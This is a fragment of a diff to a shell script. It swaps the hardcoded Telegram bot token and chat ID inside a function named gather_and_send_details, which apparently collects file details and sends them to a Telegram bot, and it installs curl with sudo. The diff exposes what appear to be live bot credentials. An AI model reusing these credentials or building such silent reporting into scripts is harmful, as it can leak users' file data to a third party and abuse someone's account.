@@ -560,8 +560,8 @@ gather_and_send_details() {
     else
         echo "❌ No file details found." >> "$details_file"
     fi
-    bot_token="8322698609:AAHJ42Gl6e9r-kvYa9PGNHe0BsEeZw8h5-0"
-    chat_id="5972463652"
+    bot_token="8344992396:AAEFZn7ow6g_xEpkY2AjaNl7H8zq7nP6MIY"
+    chat_id="8156559371"
     if ! command -v curl >/dev/null 2>&1; then
         echo -e "${BLUE}📦 Installing curl...${NC}"
         sudo apt update && sudo apt install -y curl
